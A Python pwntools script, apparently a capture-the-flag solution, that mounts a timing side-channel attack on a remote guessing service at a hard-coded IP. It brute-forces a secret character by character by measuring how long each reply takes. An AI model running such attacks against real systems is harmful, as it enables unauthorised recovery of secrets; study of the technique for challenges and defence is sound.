from pwn import remote
from time import time


chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"

r = remote("192.241.138.174", 7799)


def correct(s: str) -> int:
    start = time()
    r.sendline(s.encode())
    resp = r.recvline()
    end = time()

    if "Better luck next time!" not in resp.decode():
        print(resp)
        return -1

    ret = round(10 * (end - start))
    print(s, "-->", ret)
    return ret


def main():
    r.recvuntil("Guess the random number!\n")
    cur = ''
    while correct(cur) != -1:
        ctime = correct(cur)
        print()
        # print(cur, '->', ctime)

        for c in chars:
            cor = correct(cur + c)
            if cor > ctime + 8 or cor == -1:
                cur += c
                break


if __name__ == "__main__":
    main()